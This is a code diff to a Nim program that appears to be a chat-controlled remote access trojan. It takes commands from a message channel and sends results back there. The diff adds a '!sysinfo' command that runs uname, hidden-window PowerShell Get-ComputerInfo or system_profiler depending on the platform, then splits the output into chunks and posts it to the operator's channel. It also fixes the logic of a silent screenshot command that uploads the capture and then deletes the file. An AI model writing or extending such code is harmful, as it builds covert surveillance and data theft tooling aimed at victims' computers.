@@ -110,6 +110,61 @@ proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[strin
   elif cmd == "!pwd":
     return currentDir
 
+  elif cmd == "!sysinfo":
+    var resultMsg: string
+    const maxLen = 1900
+    when defined(linux):
+      let (unameOut, unameExit) = execCmdEx("uname -a", options = {poUsePath}, workingDir = currentDir)
+      let (lsbOut, lsbExit) = execCmdEx("bash -c \"lsb_release -d 2>/dev/null\"", options = {poUsePath}, workingDir = currentDir)
+      if unameExit == 0:
+        var info = unameOut
+        if lsbExit == 0 and lsbOut.len > 0:
+          info &= "\n" & lsbOut
+        var remaining = info
+        while remaining.len > 0:
+          let chunk = if remaining.len > maxLen: remaining[0 ..< maxLen] else: remaining
+          discard await sendMessage(m.channel_id, "```\n" & chunk & "\n```")
+          if remaining.len > maxLen:
+            remaining = remaining[maxLen .. ^1]
+          else:
+            remaining = ""
+        resultMsg = "System info sent."
+      else:
+        resultMsg = "Failed to get system info: " & unameOut
+    elif defined(windows):
+      let powershellScript = "Get-ComputerInfo | ConvertTo-Json"
+      let command = "powershell -NoProfile -WindowStyle Hidden -Command \"" & powershellScript & "\""
+      let (output, exitCode) = execCmdEx(command, options = {poUsePath}, workingDir = currentDir)
+      if exitCode != 0:
+        resultMsg = "command failed with exit code " & $exitCode & ":\n" & output
+      else:
+        var remaining = output
+        while remaining.len > 0:
+          let chunk = if remaining.len > maxLen: remaining[0 ..< maxLen] else: remaining
+          discard await sendMessage(m.channel_id, "```\n" & chunk & "\n```")
+          if remaining.len > maxLen:
+            remaining = remaining[maxLen .. ^1]
+          else:
+            remaining = ""
+        resultMsg = "System info sent."
+    elif defined(macosx):
+      let (output, exitCode) = execCmdEx("system_profiler SPHardwareDataType", options = {poUsePath}, workingDir = currentDir)
+      if exitCode != 0:
+        resultMsg = "command failed with exit code " & $exitCode & ":\n" & output
+      else:
+        var remaining = output
+        while remaining.len > 0:
+          let chunk = if remaining.len > maxLen: remaining[0 ..< maxLen] else: remaining
+          discard await sendMessage(m.channel_id, "```\n" & chunk & "\n```")
+          if remaining.len > maxLen:
+            remaining = remaining[maxLen .. ^1]
+          else:
+            remaining = ""
+        resultMsg = "System info sent."
+    else:
+      resultMsg = "sysinfo not supported on this platform."
+    return resultMsg
+
   elif cmd.startsWith("!cd "):
     let newDir = cmd[3..^1].strip()
     let targetDir = if os.isAbsolute(newDir): newDir else: os.joinPath(currentDir, newDir)
@@ -187,9 +242,9 @@ proc handleCommand(rawCmd: string, m: Message, client: HttpClient): Future[strin
       let (output, exitCode) = execCmdEx("screencapture -x " & filePath)
       if exitCode == 0 and fileExists(filePath):
         await sendFile(m.channel_id, filePath, fileName)
-      if fileExists(filePath):
-        removeFile(filePath)
-      return "screenshot taken, sent and deleted!"
+        if fileExists(filePath):
+          removeFile(filePath)
+        return "screenshot taken, sent and deleted!"
       else:
         return "failed to take screenshot: " & output
     elif defined(windows):
